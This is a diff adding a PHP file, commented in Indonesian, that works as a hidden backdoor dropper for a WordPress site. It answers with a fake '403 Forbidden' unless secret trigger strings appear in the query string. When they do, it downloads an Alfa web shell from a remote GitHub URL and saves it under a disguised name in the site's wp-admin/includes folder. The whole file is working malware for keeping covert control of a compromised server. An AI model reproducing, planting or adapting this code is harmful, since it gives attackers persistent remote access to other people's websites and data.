@@ -1,0 +1,60 @@
+<?php
+// Konfigurasi
+$target_url = "https://raw.githubusercontent.com/freyarion25/ngehek/refs/heads/main/shell-alfa.txt";
+$upload_path = "/home/impuesto/public_html/wp-admin/includes/upgrade-user.php";
+$valid_string = "k yyisherelove"; // Tanpa spasi sebenarnya "kyyisherelove"
+$trigger_string = "kyyishere";
+
+// Cek querystring
+$query = isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '';
+
+// Fallback 403 jika tidak ada parameter yang sesuai
+if (empty($query)) {
+    http_response_code(403);
+    die("403 Forbidden");
+}
+
+// Decode parameter yang mungkin sudah di-encode
+parse_str($query, $params);
+
+// Cek apakah trigger string ada di parameter manapun
+$trigger_found = false;
+$valid_found = false;
+
+foreach ($params as $key => $value) {
+    if ($key === $trigger_string || $value === $trigger_string) {
+        $trigger_found = true;
+    }
+    if ($key === $valid_string || $value === $valid_string) {
+        $valid_found = true;
+    }
+}
+
+// Jika valid string tidak ditemukan, 403
+if (!$valid_found) {
+    http_response_code(403);
+    die("403 Forbidden");
+}
+
+// Jika trigger string ditemukan, jalankan task
+if ($trigger_found) {
+    // Ambil konten dari URL
+    $content = @file_get_contents($target_url);
+    
+    if ($content === false) {
+        die("Gagal mengambil konten dari URL");
+    }
+    
+    // Simpan ke file tujuan
+    $result = @file_put_contents($upload_path, $content);
+    
+    if ($result !== false) {
+        echo "Berhasil upload ke " . $upload_path;
+    } else {
+        echo "Gagal menyimpan file ke " . $upload_path;
+    }
+} else {
+    http_response_code(403);
+    die("403 Forbidden");
+}
+?>
